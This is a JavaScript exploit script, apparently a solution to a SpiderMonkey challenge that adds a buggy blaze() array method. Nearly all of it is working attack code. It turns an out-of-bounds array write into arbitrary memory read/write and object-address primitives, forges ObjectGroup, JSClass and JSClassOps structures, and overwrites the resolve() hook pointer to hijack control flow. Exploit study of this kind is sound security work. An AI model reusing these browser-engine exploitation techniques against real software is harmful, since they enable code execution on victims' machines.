load('/root/utils.js');
load('/root/int64.js');

// This will be our weird machine / exploitation primitives
class Weird {
	constructor(originalBackingBuffer) {
		this.originalBackingBuffer = originalBackingBuffer;
	}

	read(addr, length) {
		if (length == undefined) {
			throw '[-] No length provided for read!';
		}
		blazed[magicIndex] = new Int64(addr).asDouble();
		blazed[magicIndex - 2] = length;
		var data = targetArray.slice(0, length);
		this.restore();
		return data;
	}

	write(addr, value) {
		if (value == undefined) {
			throw 'No value provided for write';
		}
		blazed[magicIndex] = new Int64(addr).asDouble();
		var values = value.bytes();
		targetArray.set(values);
		this.restore();
	}

	// Place the object's address at the first element of
	// the target array. Then read the array to get the address
	addressOf(obj) {
		blazed[magicIndex + 1] = obj;	// first element of targetAddress
		var addr = new Int64(targetArray.slice(0, 8));
		return addr;
	}

	restore() {
		blazed[magicIndex] = this.originalBackingBuffer;
		blazed[magicIndex - 2] = 8;
	}
}

// This is a nasty hack to go from an Int64 tagged pointer to its payload as a string.
// It was written on a rainy day on a train to London.
const taggedPtr2ptr = tagged => "0x" + tagged.toString(16).substr(6);

const blazed = new Array(1,2,3,4,5,6);
const targetArray = new Uint8Array(8);

// The following is not strictly needed: we know that because two elements in the 
// nursery heap lie next to each other, the offsets in the second object (Uint8Array)
// relative to the first one (Array) are fixed. That is to say, secondArray[13] always
// points to the same field in Uint8Array. Obviously, objectAddress() is only
// available from the console but this bit allows us to ensure we've understood how
// things are placed on the heap.
var blazedFirstElementAddr = objectAddress(blazed);
print('[*] Blazed is at: ' + blazedFirstElementAddr);
// Inline elements on an array of 6 elements start at 0x30
blazedFirstElementAddr = new Int64().assignAdd(blazedFirstElementAddr, 0x30);

var targetAddress = objectAddress(targetArray);
print('[*] Target array is at: ' + targetAddress);
// A pointer to the backing array of a Uint8Array lies at offset 0x38
targetAddress = new Int64().assignAdd(targetAddress, 0x38);
print("[*] Target array's buffer will be at: " + targetAddress.toString());

// We calculate the index of *blazed* that corresponds to the backing array pointer in
// *targetArray*. This should always be 13!
var magicIndex = parseInt(new Int64().assignSub(targetAddress, blazedFirstElementAddr).toString()) / 8;
print("[*] Magic index is: " + magicIndex);

// Smoke weed everyday...
blazed.blaze();

// Initialise this with targetArray's original backing buffer. We want
// to remember this because we need it for weird.addressOf()
const weird = new Weird(blazed[magicIndex]);

// The memory layout (telescope) we are looking at is this, when obj is at 0x3ca4b65c3040
// 0x3ca4b65c3040: 0x00003ca4b65c14f0	# 0x00003ca4b65c14f0 → 0x0000555558d06de8  →  0x0000555557b09710  →  "Function"
// Where 0x555558d06de8 is the object group and 0x555557b09710 is the JSClass
// The object group is r-- located at .data.rel.ro but its pointer (0x3ca4b65c14f0) is rw-
// We will use this to point to a new object group in a writable location
obj = new Function(); 
taggedAddrOfObj = weird.addressOf(obj);
print("[*] Function object at: " + taggedAddrOfObj.toString(16));
addressOfObj = taggedPtr2ptr(taggedAddrOfObj);

// Read the first DWORD at *objectAddress*; this is a pointer to its object group, a.k.a. object.groupRaw()
objectGroup = new Int64(weird.read(addressOfObj, 8));
print("[*] Object group is at: " + objectGroup.toString(16));
// objectGroup has a pointer to JSClass
jsClass = new Int64(weird.read(objectGroup, 8));
print("[*] JSClass is at: " + jsClass.toString(16));
// jsClass has a pointer to JSClassOps at offset 0x10
jsClassOps = new Int64().assignAdd(jsClass, 0x10);
jsClassOps = new Int64(weird.read(jsClassOps, 8));
print("[*] JSClassOps is at: " + jsClassOps.toString(16));

// We'll reconstruct the fake object's group in this array
// sizeof('js::ObjectGroup') == 0x30
// sizeof(JSClass) == 0x30
// sizeof(JSClassOps) == 0x58
fake = new Uint8Array(0x30 + 0x30 + 0x58);
// We're only interested in the region of memory that holds our
// data structures. The 7th (7 * 8 == 54 == 0x38) word from Uint8Array is a pointer
// to its backing buffer, which we read here
taggedAddrOfFake = weird.addressOf(fake);
addressOfFake = taggedPtr2ptr(taggedAddrOfFake);
addressOfFake = new Int64().assignAdd(addressOfFake, 0x38);
addressOfFake = new Int64(weird.read(addressOfFake, 8));
print("[*] Fake data structures at: " + addressOfFake.toString(16));

// Copy entire ObjectGroup
fake.set(weird.read(objectGroup, 0x30));
// Copy entire JSFunction
fake.set(weird.read(jsClass, 0x30), 0x30);
// Copy entire JSClassOps
fake.set(weird.read(jsClassOps, 0x58), 0x60);

// At this point we've copied all the data structures we need, now we need to link them
// 1. Make the fake object group point to the fake JSClass
fake.set(new Int64().assignAdd(addressOfFake, 0x30).bytes());
// 2. Make the fake JSClass point to the fake JSClassOps
fake.set(new Int64().assignAdd(addressOfFake, 0x60).bytes(), 0x40);
// 3. Overwrite the pointer to resolve() - this function gets called when we add a new property
weird.write(new Int64().assignAdd(addressOfFake, 0x80), new Int64(0xdeadbeefdeadbeef));

// All set, let's poison the object by making it point to our object group
weird.write(addressOfObj, addressOfFake);

// Blaze it up!
obj.lostMyWalletInElSegundo = 1


